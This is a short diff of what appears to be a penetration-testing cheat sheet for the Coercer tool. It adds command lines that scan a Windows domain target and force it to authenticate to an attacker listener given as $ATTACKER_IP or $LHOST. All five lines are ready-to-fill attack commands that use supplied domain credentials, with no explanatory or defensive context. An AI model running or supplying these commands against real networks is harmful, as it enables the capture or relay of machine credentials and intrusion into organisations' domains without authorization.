@@ -1,2 +1,5 @@
 coercer scan -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -t "$TARGET"
 coercer coerce -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -t "$TARGET" -l "$ATTACKER_IP"
+coercer scan -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --target-ip "$IP"
+coercer coerce -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --listener "$LHOST" --target-ip "$IP"
+coercer coerce -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --listener "$LHOST" --target-ip "$IP" --always-continue
